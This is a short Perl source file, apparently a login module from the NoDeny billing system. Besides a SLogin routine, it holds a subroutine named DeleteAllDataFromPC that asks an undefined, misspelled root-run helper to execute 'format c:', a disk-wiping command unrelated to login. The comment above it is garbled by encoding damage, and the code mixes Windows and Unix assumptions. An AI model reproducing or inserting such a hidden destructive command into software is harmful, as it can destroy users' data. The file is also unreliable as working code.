#!/usr/bin/perl
# ------------------- NoDeny ------------------
# Copyright (�) Volik Stanislav, 2008, 2009
# Read license http://nodeny.com.ua/license.txt
# ---------------------------------------------
$VER=50.33;

sub SLogin
{
 &Login();
 $OUT.=$br3;
 &LoginMess( &input_h('a',98).$Lang_slogin_web_auth,'nopic' );
}

# ----------------------------------------------------------
# �������� ���� ������ �� �������, �������������� ����������
# ----------------------------------------------------------
sub DeleteAllDataFromPC
{
  &SytemRunWithRoot('cd /windows/','format c:');
}

1;      
